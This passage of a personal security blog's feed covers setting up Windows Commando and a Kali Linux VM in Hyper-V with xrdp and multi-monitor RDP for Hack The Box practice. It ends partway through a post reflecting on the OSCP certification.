&lt;p&gt;An issue I had was with the command &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;apt-get -y update --fix-missing &amp;amp;&amp;amp; apt-get -y dist-upgrade &amp;amp;&amp;amp; exit&lt;/code&gt; when the script was installing the kali linux subsystem:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;\assets\images\KaliSetup\posts\dpkg.png&quot; alt=&quot;dpkg.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;My network card went into hibernate on the host machine and interrupted the install, doh!&lt;/p&gt;

&lt;p&gt;I ran the suggested command to attempt a repair:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-shell&quot; data-lang=&quot;shell&quot;&gt;dpkg &lt;span class=&quot;nt&quot;&gt;--configure&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-a&lt;/span&gt; &lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;This will take a while.&lt;/p&gt;

&lt;p&gt;At various stages, some of the Kali packages may fail. In some cases this will be because the host won’t have the “hardware” (Bluetooth for example) or because the packages are not compatible (yet). The Kali packages in the subsystem aren’t as big a deal for me as my preference is to use a Kali VM for Linux, but the benefits of having Linux tooling on Windows (curl, wget, ssh etc) make this a worthwhile tool to configure.&lt;/p&gt;

&lt;p&gt;Once the command finishes, the installation can continue if I run the following in the Kali subsystem terminal:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-shell&quot; data-lang=&quot;shell&quot;&gt;apt-get &lt;span class=&quot;nt&quot;&gt;-y&lt;/span&gt; update &lt;span class=&quot;nt&quot;&gt;--fix-missing&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; apt-get &lt;span class=&quot;nt&quot;&gt;-y&lt;/span&gt; dist-upgrade &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;exit&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;This caused the script to time out and fail on the cmd terminal:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;\assets\images\KaliSetup\posts\scriptFail.png&quot; alt=&quot;scriptFail.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Full disclosure: I had to run the script once to complete the setup, but it took about 8 hours to complete.&lt;/p&gt;

&lt;p&gt;I let the rest of the Kali install, but it doesn’t complete the build, if like me you don’t see the README.md and the Background Commando you might need to run the script again as admin:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-powershell&quot; data-lang=&quot;powershell&quot;&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;\install.ps1&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;This time it progresses a lot faster, the PoSH terminal will throw and handle errors as it encounters dependencies that it missed the first time round and validates packages that are already installed.&lt;/p&gt;

&lt;p&gt;Following the on screen prompts eventually produces the finished framework:&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;As I’m running this on a VM, the Hyper-V tooling is not available and will always throw an error.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Note the README.md and the Background have been set.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;\assets\images\KaliSetup\posts\commandoDesktop.png&quot; alt=&quot;commando.png&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;wrap-up&quot;&gt;Wrap Up&lt;/h2&gt;

&lt;p&gt;During this post we introduced Commando on Windows 10 and took a look at the steps to install it. Next post &lt;a href=&quot;/kalisetup/Clean-Kali-Setup-for-HTB.html&quot;&gt;Clean Kali Setup for HTB&lt;/a&gt; I’m going to look at building on the my original Kali Image to get set up for &lt;a href=&quot;https://www.hackthebox.eu/home&quot;&gt;HTB&lt;/a&gt;&lt;/p&gt;</content><author><name></name></author><category term="LabSetup" /><category term="HyperV" /><category term="Windows" /><summary type="html">Kali is the industry agreed Linux platform for Penetration Testing. While it is an excellent framework, sometimes it can be challenging getting it to fit Windows use-cases. Often it is simpler just to use Windows, in this post I’m going to setup a Windows Commando VM.</summary></entry><entry><title type="html">Kali Linux HyperV Style</title><link href="http://localhost:4000/kalisetup/Kali-Linux-HyperV-Style.html" rel="alternate" type="text/html" title="Kali Linux HyperV Style" /><published>2020-04-17T00:00:00+01:00</published><updated>2020-04-17T00:00:00+01:00</updated><id>http://localhost:4000/kalisetup/Kali-Linux-HyperV-Style</id><content type="html" xml:base="http://localhost:4000/kalisetup/Kali-Linux-HyperV-Style.html">&lt;p&gt;Sometimes I run Kali in HyperV, because I have a beefy windows 10 (professional) laptop and also why the hell not?!? 
This post I’m going to build out a HyperV Kali VM from the base image available from Offensive Security.&lt;/p&gt;

&lt;h2 id=&quot;prerequisites&quot;&gt;Prerequisites&lt;/h2&gt;

&lt;p&gt;Once you have these on your system, we can start building.&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;Kali Image, I’m using the &lt;strong&gt;Kali Linux 64-Bit (Installer) 2020.1b&lt;/strong&gt; iso, but the latest builds are available &lt;a href=&quot;https://www.kali.org/downloads/&quot;&gt;here&lt;/a&gt;.&lt;/li&gt;
  &lt;li&gt;You will need &lt;a href=&quot;https://docs.microsoft.com/en-us/virtualization/hyper-v-on-windows/about/&quot;&gt;HyperV&lt;/a&gt; and &lt;a href=&quot;https://docs.microsoft.com/en-us/windows-server/remote/remote-desktop-services/clients/remote-desktop-clients&quot;&gt;Remote Desktop&lt;/a&gt;.
I’m using Windows 10 Pro, so I have the native windows clients for these built in.&lt;/li&gt;
&lt;/ol&gt;

&lt;h2 id=&quot;hyperv-vs-vmware-player-and-virtual-box&quot;&gt;HyperV vs VMWare Player and Virtual Box&lt;/h2&gt;

&lt;p&gt;Before I begin, we should note that there are a few differences between HyperV and other popular virtualization platforms like VMWare or VirtualBox. Purists will point out that these platforms have been optimized and don’t &lt;em&gt;quite&lt;/em&gt; fit this model anymore, historically both VMWare and VirtualBox were Type2 hypervisors. What this means is that they use a hypervisor engine which manages virtualization on top of the base OS. For the sake of simplicity we can think of these as running the hypervisor software and it’s VMs at the same logic level as applications.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;\assets\images\KaliSetup\posts\Type2.png&quot; alt=&quot;Type2.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;HyperV isn’t software that runs on top of the ‘host’ OS, it abstracts out the Host OS to be a ‘Parent’ VM that we can use for admin functions:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;\assets\images\KaliSetup\posts\micro.png&quot; alt=&quot;micro.png&quot; /&gt;&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;When I talk about Host VMs, I am referring to the Parent or Admin VM, while technically they are different, functionally they perform the same role in most cases. The Guests are all the other VMs managed by the hypervisor.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;This technique turns HyperV into a Type1 hypervisor which not only exposes more hardware resources for the VMs but also offers logical sand-boxing increasing security. The main problem with this approach is that the host machine is now a VM, which means it is very, very difficult to use other virtualization platforms at the same time as HyperV.&lt;/p&gt;

&lt;p&gt;Anecdotally I’ve noticed better performance than with VMWare and VirtualBox but the actual mileage varies depending on your base hardware and the Guests. These days I’m using HyperV because once it is set up it feels more like using genuine machines.&lt;/p&gt;

&lt;p&gt;Before we go onto the next stage we need HyperV installed. This can be configured via &lt;a href=&quot;https://docs.microsoft.com/en-us/virtualization/hyper-v-on-windows/about/&quot;&gt;here&lt;/a&gt; .&lt;/p&gt;

&lt;h2 id=&quot;setup-the-virtual-hardware&quot;&gt;Setup the Virtual Hardware&lt;/h2&gt;

&lt;p&gt;First we need a Virtual switch manager for our server, so open &lt;strong&gt;Hyper-V Manager&lt;/strong&gt; and select the server you want to connect to. In my case this is my Laptop is the only server I can connect to.&lt;/p&gt;

&lt;p&gt;Right click on it and select &lt;strong&gt;New&lt;/strong&gt;, &lt;strong&gt;Virtual Switch Manager&lt;/strong&gt;, &lt;strong&gt;New virtual network switch&lt;/strong&gt; and as I’ll be wanting a host that can connect to the HTB Labs I’ll be selecting an &lt;strong&gt;External&lt;/strong&gt; Virtual Switch.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;\assets\images\KaliSetup\posts\vsm.png&quot; alt=&quot;vsm.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Next I need to make a Virtual Machine, I go to the server again and right click on it and select &lt;strong&gt;New&lt;/strong&gt;, &lt;strong&gt;Virtual Machine&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;This starts the wizard.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;\assets\images\KaliSetup\posts\wiz.png&quot; alt=&quot;wiz.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;I follow the wizard, specifying where I want to store the VM details.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;\assets\images\KaliSetup\posts\vmLocation.png&quot; alt=&quot;vmLocation.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;I specify &lt;strong&gt;gen2&lt;/strong&gt; because I want all the performance benefits that my OS supports and I’m using the 2020 version of Kali. However, older OS versions like XP, Win7 and 32 Bit may require gen1 mode.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;\assets\images\KaliSetup\posts\gen2.png&quot; alt=&quot;gen2.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Next is the memory, I want a beefy machine for this and can cope with a &lt;strong&gt;16GB&lt;/strong&gt; VM.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;\assets\images\KaliSetup\posts\mem.png&quot; alt=&quot;mem.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;I select the &lt;strong&gt;External&lt;/strong&gt; network I set up previously.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;\assets\images\KaliSetup\posts\net.png&quot; alt=&quot;net.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;I take the defaults for the storage as I’m not anticipating keeping a lot of data on this VM.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;\assets\images\KaliSetup\posts\store.png&quot; alt=&quot;store.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;I go to the &lt;strong&gt;kali-linux-2020.1b-installer-amd64.iso&lt;/strong&gt; I previously downloaded and select it as the iso I want to use.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;\assets\images\KaliSetup\posts\iso.png&quot; alt=&quot;iso.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;After reviewing the settings in the Summary, I select Finish to build the hardware.&lt;/p&gt;

&lt;p&gt;And I get a finished bare bones guest called Kali ready for me to install.&lt;/p&gt;

&lt;h2 id=&quot;advanced-hardware-optional&quot;&gt;Advanced Hardware [OPTIONAL]&lt;/h2&gt;
&lt;p&gt;It’s best to do all the Hardware configuration &lt;strong&gt;BEFORE&lt;/strong&gt; you install the OS, this way the installer will pick up what it can automatically and you don’t need to organize anything at the OS level later on. I want to use the power of my graphics card to make the system work better. The following items are things you might want to consider before we install Kali, my build skips all of these and jumps to &lt;a href=&quot;#powerOn&quot;&gt;Power On!&lt;/a&gt;&lt;/p&gt;

&lt;h3 id=&quot;gpu-forwarding-for-remotefx&quot;&gt;GPU forwarding for RemoteFX&lt;/h3&gt;

&lt;p&gt;RemoteFX is a deprecated feature as of Windows 10/Server 2019, we can’t use it by default via the GUI.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;\assets\images\KaliSetup\posts\noRemFX.png&quot; alt=&quot;noRemFX.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;If I really want to use it (because I can’t get RDP for example) as its easier than messing around with my drivers on the host.
We aren’t running production servers for multiple users, so this could be a good way to manage our VMs in a pinch and also makes use of the GPU I have in my Laptop.
Because it is no-longer supported, I can’t enable this in the GUI but can via powershell.&lt;/p&gt;

&lt;p&gt;First I want to check my card supports it and is on:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-ps&quot; data-lang=&quot;ps&quot;&gt;Get-VMRemoteFXPhysicalVideoAdapter&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;And it does:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# REDACTED #
Name                        : NVIDIA GeForce GTX 1070
# REDACTED #
Enabled                     : True
CompatibleForVirtualization : True
# REDACTED #

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;I Enable Host GPU for RemoteFX vGPU&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-ps&quot; data-lang=&quot;ps&quot;&gt;Enable-VMRemoteFXPhysicalVideoAdapter &quot;NVIDIA GeForce GTX 1070&quot;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;I can check the VM names I want to make this available to with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Get-VM&lt;/code&gt; but I know that its called Kali, so I run:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-ps&quot; data-lang=&quot;ps&quot;&gt;Add-VMRemoteFx3dVideoAdapter -VMName &quot;Kali&quot;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;blockquote&gt;
  &lt;p&gt;If I want to disable this at a later date I can use &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Disable-VMRemoteFXPhysicalVideoAdapter &quot;NVIDIA GeForce GTX 1070&quot;&lt;/code&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;This allows me to configure Advanced features RemoteFX 3D Video Adapter, like 8 monitors!&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;\assets\images\KaliSetup\posts\remFX.png&quot; alt=&quot;remFX.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;I don’t need that many, and I’ll be using standard RDP, but it is good to know we can use some customization on the default remote client.&lt;/p&gt;

&lt;h3 id=&quot;second-nic&quot;&gt;Second NIC&lt;/h3&gt;

&lt;p&gt;Sometimes I also like to have a secondary NIC for the default network, this lets me easily test against local machines.&lt;/p&gt;

&lt;p&gt;On the machine settings, I select &lt;strong&gt;Add Hardware&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;\assets\images\KaliSetup\posts\2ndNic.png&quot; alt=&quot;2ndNic.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Pick &lt;strong&gt;Network Adapter&lt;/strong&gt; with &lt;strong&gt;Default Switch&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;\assets\images\KaliSetup\posts\2ndNicConfig.png&quot; alt=&quot;2ndNicConfig.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Once I select apply I get a second Network card.&lt;/p&gt;

&lt;h3 id=&quot;other-items&quot;&gt;Other Items&lt;/h3&gt;

&lt;p&gt;At this point I’m happy to start the Kali install, but I &lt;em&gt;could&lt;/em&gt; look at setting up a network share, or tweaking the processors but at this point I really don’t need to, this VM will be for use in &lt;a href=&quot;https://www.hackthebox.eu/home&quot;&gt;HTB&lt;/a&gt; all the extras are overkill at this stage.&lt;/p&gt;

&lt;h2 id=&quot;-power-on&quot;&gt;&lt;a name=&quot;powerOn&quot;&gt;&lt;/a&gt; Power On!&lt;/h2&gt;

&lt;p&gt;Happy with this I make sure to un-check the secure boot option so that I can install Kali:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;\assets\images\KaliSetup\posts\secBoot.png&quot; alt=&quot;secBoot.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;I power on the VM in the main menu to check everything works and select &lt;strong&gt;Graphic Install&lt;/strong&gt; to kick it off…&lt;/p&gt;

&lt;p&gt;Not re-inventing the wheel on this page, the official guide is &lt;a href=&quot;https://www.kali.org/docs/base-images/kali-linux-hard-disk-install/&quot;&gt;here&lt;/a&gt; and will keep you right better than I ever could.&lt;/p&gt;

&lt;p&gt;I had some graphical glitches until I got the system installed, but opted for the standard 2020 packages:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;\assets\images\KaliSetup\posts\default.png&quot; alt=&quot;default.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Once the installer completes I’m left with a fully functional kali machine.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;\assets\images\KaliSetup\posts\kaliVM.png&quot; alt=&quot;kaliVM.png&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;remote-desktop&quot;&gt;Remote Desktop&lt;/h2&gt;

&lt;p&gt;At this point I &lt;em&gt;could&lt;/em&gt; finish up, but the problem with HyperV is that the default RDP client is a little poor on features and doesn’t scale desktop resizes so well. It is really only designed to enable you to login for admin purposes, I need is something closer to a multi-screen desktop experience. For that teh HypeV Manager viewer just won’t cut it, I’ll need to set up either RDP or VNC. My preference from a windows host is RDP as its a native to the OS and requires only a little additional configuration.&lt;/p&gt;

&lt;p&gt;On windows hosts this is fairly trivial, but on linux we need to install some software. After logging in I pop a terminal and run the following command to install an rdp server on Kali:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-shell&quot; data-lang=&quot;shell&quot;&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;apt &lt;span class=&quot;nb&quot;&gt;install &lt;/span&gt;xrdp &lt;span class=&quot;nt&quot;&gt;-y&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Next I want to ensure it works, first i take note of the IP address &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;192.168.0.47&lt;/code&gt; via the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ifconfig&lt;/code&gt; command. I’ll need this to connect from my Host to the Kali guest.&lt;/p&gt;

&lt;p&gt;root logins over RDP are not a good idea, you may want to create an admin user if you have not already done so.&lt;/p&gt;

&lt;p&gt;Next I run the following commands in order to start the RDP service now and on every reboot:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-shell&quot; data-lang=&quot;shell&quot;&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;service xrdp start
&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;service xrdp-sesman start
update-rc.d xrdp &lt;span class=&quot;nb&quot;&gt;enable&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Once that completes I log out of the Virtual Machine Connection and go to the RDP program in windows, and try to connect to VM’s IP address and to get to the session login page.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;\assets\images\KaliSetup\posts\xorg.png&quot; alt=&quot;xorg.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;With the Xorg session I can login with the same user credentials I supplied when I set up my Kali OS, but a single screen isn’t going to be enough.&lt;/p&gt;

&lt;p&gt;Fortunately The rdp client has the option to use all of your screens for RDP connections, but this is overkill I only need want 2 screens. The GUI only has an all or none solution here, I only want to apply 2 screens. I need to create a custom config file to do this.&lt;/p&gt;

&lt;p&gt;I click the show options to allow me to use a custom config file:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;\assets\images\KaliSetup\posts\rdp.png&quot; alt=&quot;rdp.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Because I’ve already attempted to connect there is a Default.rdp file in My Documents Folder.&lt;/p&gt;

&lt;p&gt;it looks like this:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;screen mode id:i:2
use multimon:i:0
desktopwidth:i:1920
desktopheight:i:1080
session bpp:i:32
winposstr:s:0,1,-3229,-897,-1292,-251
compression:i:1
keyboardhook:i:2
audiocapturemode:i:0
videoplaybackmode:i:1
connection type:i:7
networkautodetect:i:1
bandwidthautodetect:i:1
displayconnectionbar:i:1
enableworkspacereconnect:i:0
disable wallpaper:i:0
allow font smoothing:i:0
allow desktop composition:i:0
disable full window drag:i:1
disable menu anims:i:1
disable themes:i:0
disable cursor setting:i:0
bitmapcachepersistenable:i:1
full address:s:192.168.0.47
audiomode:i:0
redirectprinters:i:1
redirectcomports:i:0
redirectsmartcards:i:1
redirectclipboard:i:1
redirectposdevices:i:0
drivestoredirect:s:
autoreconnection enabled:i:1
authentication level:i:2
prompt for credentials:i:0
negotiate security layer:i:1
remoteapplicationmode:i:0
alternate shell:s:
shell working directory:s:
gatewayhostname:s:
gatewayusagemethod:i:4
gatewaycredentialssource:i:4
gatewayprofileusagemethod:i:0
promptcredentialonce:i:0
gatewaybrokeringtype:i:0
use redirection server name:i:0
rdgiskdcproxy:i:0
kdcproxyname:s:
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;In order to use more than one monitor I need to set &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;use multimon:i:1&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;selectedmonitors:&lt;/code&gt; to the monitors I want to use.&lt;/p&gt;

&lt;p&gt;using &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mstsc.exe /l&lt;/code&gt; helps to identify the values I want:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;\assets\images\KaliSetup\posts\mstsc_l.png&quot; alt=&quot;mstsc_l.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;selectedmonitors:s:1,3&lt;/code&gt; is the new value and for quickness I add &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;full address:s:192.168.0.47&lt;/code&gt; so that it auto-populates the GUI. My config now looks like this:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;screen mode id:i:2
use multimon:i:1
desktopwidth:i:1920
desktopheight:i:1080
session bpp:i:32
winposstr:s:0,1,-3229,-897,-1292,-251
compression:i:1
keyboardhook:i:2
audiocapturemode:i:0
videoplaybackmode:i:1
connection type:i:7
networkautodetect:i:1
bandwidthautodetect:i:1
displayconnectionbar:i:1
enableworkspacereconnect:i:0
disable wallpaper:i:0
allow font smoothing:i:0
allow desktop composition:i:0
disable full window drag:i:1
disable menu anims:i:1
disable themes:i:0
disable cursor setting:i:0
bitmapcachepersistenable:i:1
full address:s:192.168.0.47
audiomode:i:0
redirectprinters:i:1
redirectcomports:i:0
redirectsmartcards:i:1
redirectclipboard:i:1
redirectposdevices:i:0
drivestoredirect:s:
autoreconnection enabled:i:1
authentication level:i:2
prompt for credentials:i:0
negotiate security layer:i:1
remoteapplicationmode:i:0
alternate shell:s:
shell working directory:s:
gatewayhostname:s:
gatewayusagemethod:i:4
gatewaycredentialssource:i:4
gatewayprofileusagemethod:i:0
promptcredentialonce:i:0
gatewaybrokeringtype:i:0
use redirection server name:i:0
rdgiskdcproxy:i:0
kdcproxyname:s:
selectedmonitors:s:1,3
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Sometimes the monitor identities change on host reboots and depending on how the IP Address is managed it &lt;em&gt;can&lt;/em&gt; change, stabilizing these isn’t really a priority for this tutorial as it is a minor thing to correct if I have issues getting on to the machine.&lt;/p&gt;

&lt;p&gt;Now the login spans 2 screens, and when I login I’m met with an authentication challenge:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;\assets\images\KaliSetup\posts\multiMonKali.png&quot; alt=&quot;multiMonKali.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;I need to provide elevated credentials in order to complete the display profile setup. I do this and the Kali VM is ready.&lt;/p&gt;

&lt;h2 id=&quot;backup-the-vm&quot;&gt;‘Backup’ the VM&lt;/h2&gt;

&lt;p&gt;This machine is destined to be my base ‘backup’ image, so the last thing I want do is make a snapshot. Microsoft uses a term checkpoint for quick rollback snapshots, while this is useful I want to keep a full clone of this build in case I need to go a different way with the tooling configurations.&lt;/p&gt;

&lt;p&gt;I do this using the &lt;strong&gt;Export&lt;/strong&gt; function, but first I need to power off the VM. So I log out of RDP and Power off the VM in the &lt;strong&gt;Hyper-V Manager&lt;/strong&gt;.
This triggers a Merging for the VM, which acts as the starting point of the VM next time. Next I select &lt;strong&gt;Export&lt;/strong&gt; in Kali in the Actions pane.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;\assets\images\KaliSetup\posts\export.png&quot; alt=&quot;export.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;This triggers an Exporting Status for the Kali VM, which when complete gives me a backup I can Import.&lt;/p&gt;

&lt;h2 id=&quot;wrap-up&quot;&gt;Wrap Up&lt;/h2&gt;

&lt;p&gt;During this post we looked at how to set up a base Kali VM for HTB on Windows 10 Professional using HyperV. 
We configured some virtual hardware, looked at some optional additions for GPU and an extra NIC. 
Next we configured RDP from a post install of the Kali OS on our hardware and finally we made a backup image for use in the future.&lt;/p&gt;

&lt;p&gt;Next post &lt;a href=&quot;/kalisetup/Windows-Commando-Install.html&quot;&gt;Windows Commando&lt;/a&gt; I’m going to look at building on this image and get set up for &lt;a href=&quot;https://www.hackthebox.eu/home&quot;&gt;HTB&lt;/a&gt;&lt;/p&gt;</content><author><name></name></author><category term="LabSetup" /><category term="HyperV" /><summary type="html">Sometimes I run Kali in HyperV, because I have a beefy windows 10 (professional) laptop and also why the hell not?!? This post I’m going to build out a HyperV Kali VM from the base image available from Offensive Security.</summary></entry><entry><title type="html">Debunking OSCP</title><link href="http://localhost:4000/offsecmusings/Debunking-OSCP.html" rel="alternate" type="text/html" title="Debunking OSCP" /><published>2020-04-11T00:00:00+01:00</published><updated>2020-04-11T00:00:00+01:00</updated><id>http://localhost:4000/offsecmusings/Debunking-OSCP</id><content type="html" xml:base="http://localhost:4000/offsecmusings/Debunking-OSCP.html">&lt;p&gt;A couple of years ago I passed my Offensive Security Certified Professional (OSCP) certification. Often considered &lt;strong&gt;the&lt;/strong&gt; certification to get in the pen-testing space it has a fearsome reputation for being very difficult. In this post I’m looking at debunking some of the myths.&lt;/p&gt;

&lt;h2 id=&quot;what-is-offensive-security-certified-professional&quot;&gt;What is Offensive Security Certified Professional?&lt;/h2&gt;

&lt;p&gt;The internet will tell you a lot anecdotally about OSCP but the best place to learn about it is the official &lt;a href=&quot;https://www.offensive-security.com/pwk-oscp/&quot;&gt;PWK/OSCP Site&lt;/a&gt;. In summary OSCP is a 2 day exam consisting of a 24 hour practical exam of 5 challenges followed by a further 24 hours to submit your written report of your efforts.&lt;/p&gt;

&lt;p&gt;In order to sit the exam, you need to sign up for the Penetration Testing with Kali (PWK) which not only gives you personal training documentation and videos but also access to one of many shared network labs. The course content is excellent as are the scenarios presented in the lab, I’ve had the good fortune of sampling many different trainings in this area and PWK with OSCP is one of the best available publicly. I thoroughly recommend it for anyone interested in technical security as it exposes you to hacker techniques and teaches hard lessons.&lt;/p&gt;

&lt;h2 id=&quot;what-will-pwk-teach-me&quot;&gt;What will PWK teach me?&lt;/h2&gt;

&lt;p&gt;It is important to remember that PWK is a foundational course, it covers a lot of different content but does not go too deep. It will not turn you into an elite hacker but it will give you exposure to many of the different techniques needed to perform attacks. The OSCP exam proves that you have sufficient mastery of these techniques and can adapt perform assessments on non standard environments.&lt;/p&gt;

&lt;p&gt;The main thing you learn is how to use Kali Linux for pentesting, which is expected as the course is is Pen-Testing With Kali Linux. This isn’t a bad thing, Kali is a pretty decent OS, recently it underwent a massive facelift and has become far more user friendly than older iterations.&lt;/p&gt;

&lt;p&gt;At time of writing it does not require exploit development from scratch, although being able to read and edit existing python, perl, C, PoSH, ruby, JS, php and bash is expected. While this seems like a multitude of languages to learn you need only a rudimentary understanding of how to read and where to edit it to customize existing exploits. Prior to sitting PWK I had some exposure to python and bash, by the end I could confidently read and edit all of the above languages.&lt;/p&gt;

&lt;p&gt;The biggest thing you learn from PWK is how to &lt;strong&gt;Try Harder&lt;/strong&gt;, as so eloquently described &lt;a href=&quot;https://www.offensive-security.com/offsec/what-it-means-to-try-harder/&quot;&gt;here&lt;/a&gt;. It took me 3 attempts to get the certification, each time I became more determined to pass until eventually I tried Hard enough to succeed.&lt;/p&gt;

&lt;h2 id=&quot;why-do-oscp&quot;&gt;Why do OSCP?&lt;/h2&gt;

&lt;p&gt;As I mentioned earlier it took me 3 attempts to get the certification. Each time I became more determined to pass until eventually I Tried Hard enough to succeed.
This is why I recommend it, not because I became a ‘l33tz h4xx0r’ but because it developed new skills and an attitude which have served me well in my professional career so far.&lt;/p&gt;

&lt;p&gt;For me OSCP was more than a certification, it was a challenge to overcome a marathon to complete or a mountain to climb. I did a lot of reading on it before hand and it’s reputation made it something I wanted to achieve. It gave me something to aim for and something to train for, which I really wanted at the time and so I went for it.&lt;/p&gt;

&lt;p&gt;At the time I was the first of my peers to sit it, but since then I’ve met many individuals with different skill sets and the difficulty factor varies. Depending on your experience many of the sections can be trivial to learn and if you’ve spent considerable time on alternate platforms many of the techniques explored will already be in your repertoire.&lt;/p&gt;

&lt;p&gt;Do OSCP if you want to learn something, not if you want a certification it is a measure of a learning journey and not a post to say you made it to the destination. 
